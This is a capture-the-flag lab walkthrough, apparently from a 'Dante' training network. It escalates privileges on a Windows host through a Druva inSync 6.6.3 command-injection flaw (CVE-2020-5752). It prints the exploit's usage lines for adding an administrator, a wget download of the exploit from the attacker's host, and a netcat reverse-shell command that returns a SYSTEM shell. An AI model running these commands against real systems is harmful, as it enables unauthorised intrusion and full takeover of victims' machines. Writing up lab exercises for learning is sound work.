# Lateral Movement
## 172.16.1.13
```
C:\xampp\htdocs\discuss\ups>cd C:\\Program Files (x86)
cd C:\\Program Files (x86)

C:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B19F-120D

 Directory of C:\Program Files (x86)

13/07/2020  05:42    <DIR>          .
13/07/2020  05:42    <DIR>          ..
18/03/2019  21:02    <DIR>          Common Files
13/07/2020  03:35    <DIR>          Druva
13/07/2020  05:39    <DIR>          Internet Explorer
18/03/2019  20:52    <DIR>          Microsoft.NET
18/03/2019  22:20    <DIR>          Windows Defender
18/03/2019  20:52    <DIR>          Windows Mail
13/07/2020  05:39    <DIR>          Windows Media Player
18/03/2019  22:23    <DIR>          Windows Multimedia Platform
18/03/2019  21:02    <DIR>          Windows NT
13/07/2020  05:39    <DIR>          Windows Photo Viewer
18/03/2019  22:23    <DIR>          Windows Portable Devices
18/03/2019  20:52    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              14 Dir(s)   4,738,031,616 bytes free

C:\Program Files (x86)>
```

Looking for Druva
```
C:\Program Files (x86)>cd Druva\InSync
cd Druva\InSync

C:\Program Files (x86)\Druva\inSync>type licence.txt
type licence.txt
Druva InSync 6.6.3
Copyright (c) 2019 Druva Inc. 
C:\Program Files (x86)\Druva\inSync>
```
```
$ searchsploit "Druva InSync"                
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Druva inSync Windows Client 6.5.2 - Local Privilege Escalation                                                                            | windows/local/48400.txt
Druva inSync Windows Client 6.6.3 - Local Privilege Escalation                                                                            | windows/local/48505.txt
Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)                                                               | windows/local/49211.ps1
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
```
$ cat /usr/share/exploitdb/exploits/windows/local/48505.txt
```
```Python
# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation
# Date: 2020-05-21
# Exploit Author: Matteo Malvica
# Credits: Chris Lyne for previous version's exploit
# Vendor Homepage: druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
# Version: 6.6.3
# Tested on: Windows 10 1909-18363.778
# CVE: CVE-2020-5752
# Command injection in inSyncCPHwnet64 RPC service
# Runs as nt authority\system. so we have a local privilege escalation
# The path validation has been only implemented through a 'strncmp' function which can be bypassed by
# appending a directory traversal escape sequence at the end of the valid path.
# Writeup: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/

# Example usage:
#python insync.py "windows\system32\cmd.exe /C net user Leon /add"
#python insync.py "windows\system32\cmd.exe /C net localgroup Administrators Leon /add"
```
```
$ cp /usr/share/exploitdb/exploits/windows/local/48505.txt insync.py
$ python3 -m http.server 80                                                                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Download the local exploit
```
C:\Program Files (x86)\Druva\inSync>cd C:\Users\gerald\AppData\Local\Temp
C:\Users\gerald\AppData\Local\Temp>mkdir junk
C:\Users\gerald\AppData\Local\Temp>cd junk
C:\Users\gerald\AppData\Local\Temp\junk>
C:\Users\gerald\AppData\Local\Temp\junk>powershell wget 10.10.14.2/insync.py -o insync.py
```

Running the exploit
```
C:\python27\python.exe insync.py "windows\system32\cmd.exe /C net localgroup Administrators gerald /add"
```
```
net user gerald
```
```Powershell
User name                    gerald
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?13/?07/?2020 09:26:56
Password expires             Never
Password changeable          ?13/?07/?2020 09:26:56
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   ?02/?03/?2024 19:17:25

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Reverse shell as admin
```
$ nc -lvnp 9002
```
```
C:\python27\python.exe insync.py "windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc.exe 10.10.14.2 9002 -e cmd.exe"

```
```
listening on [any] 9002 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.110.3] 28295
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
DANTE{Bad_pr4ct1ces_Thru_strncmp}
C:\WINDOWS\system32>
```